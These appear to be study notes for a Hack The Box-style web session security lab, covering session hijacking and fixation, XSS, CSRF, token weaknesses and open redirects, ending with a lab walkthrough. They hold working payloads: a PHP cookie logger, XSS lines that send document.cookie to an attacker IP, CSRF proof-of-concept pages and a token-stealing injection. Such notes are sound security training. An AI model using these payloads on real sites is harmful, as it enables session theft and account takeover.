# Session Security

1. [Session Hijacking](#session-hijacking)
1. [Session Fixation](#session-fixation)
1. [Obtaining Session Identifiers without User Interaction](#obtaining-session-identifiers-without-user-interaction)
1. [XSS](#xss)
1. [Cross-Site Request Forgery](#cross-site-request-forgery)
1. [XSS & CSRF Chaining](#xss--csrf-chaining)
1. [Exploiting Weak CSRF Tokens](#exploiting-weak-csrf-tokens)
1. [Open Redirect](#open-redirect)
1. [Skills Assessment](#skills-assessment)

## Session Hijacking

* HTTP is a stateless protocol, so each request should carry required info for server, and session state resides on client-side

* Session ID - token based on which user sessions are generated & differentiated

* Modifying ```/etc/hosts``` to work with vhosts:

  ```sh
  IP=10.10.24.120
  #target machine IP

  printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
  ```

* Session hijacking - taking advantage of insecure session identifiers and using them to impersonate victim and authenticate to server; session identifiers can be commonly found by passive traffic sniffing, XSS attacks, browser history, log diving or read access to DB containing info

* For given example, we can login using given creds; after login, we can see a cookie named ```auth-session```, which is mostly as the session identifier here

* Suppose we somehow got access to this cookie value; if we navigate to this website in a new private window, and replace the current ```auth-session``` cookie value with the copied value and reload the page, we login as the previous user

## Session Fixation

* These attacks occur when attacker can fixate a valid session identifier

* Stages of attack:

  * attacker manages to obtain a valid session identifier
  * attacker manages to fixate a valid session identifier (it remains the same post-login; and the values are accepted from URL query strings or POST data)
  * attacker tricks victim into establishing a session using above session identifier

* For given example, we can see a token in URL, and a ```PHPSESSID``` cookie with the same value as the token

* If the value of the token in URL is changed, so does the ```PHPSESSID``` cookie; this indicates session fixation. Another way to check for this is by trying to pass the cookie value as a parameter (?PHPSESSID=cookievalue) and check if that value is propagated

* An attacker could send a modified URL now to a victim; if victim logs in, attacker can hijack the session since session identifier is known after fixation

## Obtaining Session Identifiers without User Interaction

* Traffic sniffing:

  * requires attacker and victim to be on same network, and HTTP traffic should be unencrypted

  * use Wireshark - ```sudo -E wireshark``` - and start sniffing on ```tun0``` interface

  * if we login as a valid user in the given website, and filter for ```HTTP``` traffic in Wireshark, we can then search for any ```auth-session``` cookies ('Find Packet' with 'Packet bytes' and 'String' options)

  * we get packets with this cookie value - this can be used to login as a user, bypassing the login page

* Web server access:

  * in post-exploitation phase, if we have access to web server, we can try to fetch session identifiers

  * In case of PHP web server -

    ```shell
    locate php.ini
    # session.save_path entry to be found in this file
    
    cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'

    cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
    # this shows the path where sessions are saved

    ls /var/lib/php/sessions
    # view files named sess_<sessionID>
    # this sessionID in filename can be used as cookie value for PHPSESSID
    ```

* Database access:

  * in post-exploitation phase, if we have access to DB, we can check for stored user sessions -

    ```sql
    show databases;

    use project;

    show tables;

    select * from users;

    select * from all_sessions;
    ```

## XSS

* For XSS (cross-site scripting) attacks to result in session cookie leakage, session cookies should be carried in all HTTP requests and they should be accessible by JS code (```HTTPOnly``` attribute should be missing)

* We can start by testing XSS payloads with event handlers like ```onload```, ```onerror``` or ```onmouseover```:

  ```js
  "><img src=x onerror=prompt(document.domain)>

  "><img src=x onerror=confirm(1)>

  "><img src=x onerror=alert(1)>
  // these payloads can be tested in all available fields
  ```

* We need to test input fields with all possible payloads, and also test all app functionality to execute the payload; in given example, the 'Share' functionality triggers the payload ```"><img src=x onerror=alert(1)>``` (```HTTPOnly``` is 'off' in this case)

* Simple cookie-logging script ('log.php') to obtain a victim's session cookie - this waits for anyone to request ```?c=+document.cookie```, then it parses the cookie:

  ```php
  <?php
  $logFile = "cookieLog.txt";
  $cookie = $_REQUEST["c"];

  $handle = fopen($logFile, "a");
  fwrite($handle, $cookie . "\n\n");
  fclose($handle);

  header("Location: http://www.google.com/");
  exit;
  ?>
  ```

* Host the script using ```php -S 10.10.120.14:8000```; for the vulnerable field found above, we can use a payload like this:

  ```js
  <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.120.14:8000/log.php?c=' + document.cookie;"></video>
  // the payload has to be crafted like this for evasion

  // if HTTPS payload was required
  <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
  // we can use something like interactsh here for OOB communication
  ```

* If we login as a victim for given webapp, and navigate to ```http://xss.htb.net/profile?email=ela.stienen@example.com``` (attacker-crafted profile, containing link to the profile tampered with previously - the link is found from the 'Share' function), we can see that the PHP server captures the request; the victim's cookie would be logged in the 'cookieLog.txt' file

* Instead of the cookie logging script, we can also use netcat - ```nc -nvlp 8000``` - and a payload like ```<h1 onmouseover='document.write(`<img src="http://10.10.120.14:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>``` or ```<script>fetch(`http://10.10.120.14:8000?cookie=${btoa(document.cookie)}`)</script>``` can be used; the cookie value can be later decoded using ```atob()``` function

## Cross-Site Request Forgery

* CSRF/XSRF attacks use malicious requests to perform unwanted functions on victim's behalf

* Webapp is vulnerable to CSRF if all parameters required for target request can be determined/guessed, and session management is solely based on HTTP cookies (and included in requests)

* To exploit a CSRF vulnerability, while the victim is logged into the app, we need to craft a malicious webpage that issues a valid cross-site request impersonating the victim

* For given webapp, we can intercept a request which shows that no anti-CSRF tokens are being used

* To test an attack, we can serve an HTML page including fields from our sample webapp - host it using ```python3 -m http.server 8000```:

  ```html
  <html>
    <body>
      <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
        <input type="hidden" name="email" value="attacker@htb.net" />
        <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
        <input type="hidden" name="country" value="CSRF_POC" />
        <input type="submit" value="Submit request" />
      </form>
      <script>
        document.getElementById("submitMe").submit()
      </script>
    </body>
  </html>
  ```

* Now, while we are logged in as victim in given webapp, we can open a new tab and visit the page we are hosting at ```http://10.10.120.14:8000/notmalicious.html``` - we can see that the victim profile details change to the one specified in above HTML code, because of this cross-site request

* CSRF (GET-based):

  * for given app, when we intercept the request for the 'Save' function, we can see that CSRF token is included in GET request:

    ```text
    GET /app/save/julie.rogers@example.com?telephone=%28834%29-609-2003&country=United+States&csrf=7a2ee594d11367dee8ef7c7de71efd7c145f4c73&email=julie.rogers%40example.com&action=save HTTP/1.1
    ```

  * we can start by serving a crafted HTML page, based off the fields included in the GET request, like done previously - the CSRF token has to be the same as the intercepted request:

    ```html
    <html>
      <body>
        <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
          <input type="hidden" name="email" value="attacker@htb.net" />
          <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
          <input type="hidden" name="country" value="CSRF_POC" />
          <input type="hidden" name="action" value="save" />
          <input type="hidden" name="csrf" value="7a2ee594d11367dee8ef7c7de71efd7c145f4c73" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.getElementById("submitMe").submit()
        </script>
      </body>
    </html>
    ```
  
  * once the page is hosted, while victim is logged in, we can open a new tab and visit the crafted webpage like before

* CSRF (POST-based):

  * for given webapp, we have a 'Delete' functionality - clicking on it leads us to '/app/delete/user@example.com', and the webpage too mentions the email

  * if we try inputting some HTML values in the email value in URL - like ```<h1>h1<u>underline<%2fu><%2fh1>``` - we can see the payload is reflected in page as well

  * from page source, we can also view that the injection happens before a single-quote (used for next attribute); we can abuse this to leak the CSRF token

  * start listening using netcat - ```nc -nvlp 8000``` - and we can use this payload in URL - ```<table%20background='%2f%2f10.10.120.14:8000%2f``` (URL-decoded form of ```<table background='//10.10.120.14:8000/```)

  * while we are still logged in, if we visit the page ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f10.10.120.14:8000%2f```, we can see the CSRF token in netcat

## XSS & CSRF Chaining

* For given app, it's mentioned that same origin/same site protections are used as anti-CSRF measures. We also have a given field ('Country') vulnerable to stored XSS attacks

* We can intercept a few requests to understand the app, following which we can craft a payload for 'Country' field to successfully execute a CSRF attack changing victim's visibility settings. Example payload:

  ```js
  // wrapped in <script> so that it is rendered as JS
  <script>
  var req = new XMLHttpRequest(); // creates an objectvariable called req - to generate a request
  req.onload = handleResponse; // onload event handler - performs action once page has been loaded
  req.open('get','/app/change-visibility',true); // arguments - request method, targeted path and 'true'
  req.send(); // sends the request

  function handleResponse(d) {
      var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1]; // token gets value of responseText from page specified in request
      // the way to identify this differs in each app - so we can inspect page or source code
      var changeReq = new XMLHttpRequest(); // to construct HTTP request to be sent through XMLHttpRequest object
      changeReq.open('post', '/app/change-visibility', true); // after first request to move to targeted page, we change request method from GET to POST
      changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // set Content-Type header
      changeReq.send('csrf='+token+'&action=change'); // send request with data of 2 parameters - csrf with token value, and action with 'change' value
      // these values were derived after intercepting request while changing visibility of profile
  };
  </script>
  ```

* Now, we can submit this payload in 'Country' field for given profile. Then, in a new private window, if we login to another profile which is currently 'Private', and browse to attacker-modified public profile using a link like ```http://minilab.htb.net/profile?email=ela.stienen@example.com``` - this modifies the new victim's profile from 'Private' to 'Public'

## Exploiting Weak CSRF Tokens

* For given webapp, we can change visibility of given profile and check the CSRF token value in the intercepted request

* Then, we can use CyberChef to try decoding the CSRF token - or attempting patterns such as ```md5(username)```, ```sha1(username)``` or ```md5(date + username)``` to check for any pitfalls in CSRF token mechanism

* Example exploit to attack users through CSRF:

  ```html
  <!-- name this file as 'press_start_2_win.html -->
  <!DOCTYPE html>
  <html lang="en">

  <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="referrer" content="never">
      <title>Proof-of-concept</title>
      <link rel="stylesheet" href="styles.css">
      <script src="./md5.min.js"></script>
  </head>

  <body>
      <h1> Click Start to win!</h1>
      <button class="button" onclick="trigger()">Start!</button>

      <script>
          let host = 'http://csrf.htb.net'

          function trigger(){
              // Creating/Refreshing the token in server side.
              window.open(`${host}/app/change-visibility`)
              window.setTimeout(startPoc, 2000)
          }

          function startPoc() {
              // Setting the username
              let hash = md5("crazygorilla983")

              window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
          }
      </script>
  </body>
  </html>
  ```

  ```shell
  # fetch md5.min.js for MD5 hash functionality to be implemented in press_start_2_win.html
  wget https://raw.githubusercontent.com/blueimp/JavaScript-MD5/master/js/md5.min.js

  # host the page
  python3 -m http.server 8000
  ```

* Now, if we navigate to target app in a private window and login as victim, we can use the exploit here to make the profile public

* While logged in as victim, navigate to the page hosted at <http://10.10.12.80:8000/press_start_2_win.html> and click on Start - once we do that, the profile becomes public

* Additional CSRF protection bypasses:

  * Null CSRF token value
  * Random CSRF token value
  * Another session's CSRF token
  * Request method tampering (HTTP verb tampering)
  * Delete CSRF token parameter or send blank token
  * Session fixation to bypass double-submit cookie (same random token as both cookie and request parameter)
  * Bypass referrer header regex or remove referrer header (add tag ```<meta name="referrer" content="no-referrer"``` in page hosting CSRF script)

## Open Redirect

* Open Redirect vuln - occurs when an attacker can redirect a victim to a malicious site by abusing a legit app's redirection function

* For example, when bug hunting, if we come across a URL like ```/login.php?redirect=dashboard```, we can check for URL parameters to modify it to ```login.php?redirect=https://evil.com```:

  * ```?url=```
  * ```?link=```
  * ```?redirect=```
  * ```?redirecturl=```
  * ```?redirect_uri=```
  * ```?return=```
  * ```?return_to=```
  * ```?returnurl=```
  * ```?go=```
  * ```?goto=```
  * ```?exit=```
  * ```?exitpage=```
  * ```?fromurl=```
  * ```?fromuri=```
  * ```?redirect_to=```
  * ```?next=```
  * ```?newurl=```
  * ```?redir=```

* For given app, on submitting the form, a POST request is done to page mentioned in ```redirect_uri``` parameter

* Test this by setting up a listener - ```nc -nvlp 4444``` - and in the ```redirect_uri``` parameter we can mention <http://10.10.66.14:4444>; if we submit the form and a connection is made in our listener, then the app is vulnerable to Open Redirect.

## Skills Assessment

* From given info, we have to hijack admin session on endpoint <http://minilab.htb.net/submit-solution> after logging in with given creds

* The '/submit-solution' endpoint needs a ```?url``` parameter to be specified - if we setup a listener and specify our URL here, we can catch a response but it does not help much

* We can start by testing payloads for given profile - we can inject XSS payloads in all 3 fields and see which gets triggered when we use some other app functionality like 'Save' or 'Share'

* The payload ```<img src=x onerror=alert(1)>``` when injected in the 'Country' field gets triggered on using the 'Share' functionality of the app

* After injecting the payload, we can keep note of the profile link on 'Share' - <http://minilab.htb.net/profile?email=julie.rogers@example.com> - since that's when the XSS payload gets triggered and we see the alert

* Now that we know this field is vulnerable to XSS, we can modify this payload to get the admin user's session cookies and eventually hijack the session; as we do not have direct access to the admin user, we will have to use this technique so that we can listen for the cookie as soon as someone uses it

* We can follow the cookie logging script as previously done:

  ```php
  <?php
  $logFile = "cookieLog.txt";
  $cookie = $_REQUEST["c"];

  $handle = fopen($logFile, "a");
  fwrite($handle, $cookie . "\n\n");
  fclose($handle);

  header("Location: http://www.google.com/");
  exit;
  ?>
  ```

* And, we can use the following payload in the 'Country' field and save:

  ```js
  <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.120.14:8000/log.php?c=' + document.cookie;"></video>
  ```

* Host the PHP file using ```php -S 10.10.120.14:8000``` and then submit the malicious URL ```http://minilab.htb.net/profile?email=julie.rogers@example.com``` in the 'url' parameter at '/submit-solution' endpoint

* In our PHP server, we are able to capture the cookie, and the endpoint gives a JSON response with 'adminVisited' set to 'true'

* Now, this cookie value can be used to replace the current ```auth-session``` cookie value (in Web Developer Tools), and then refresh the page - we get the admin profile now. Change profile visibility to get the flag
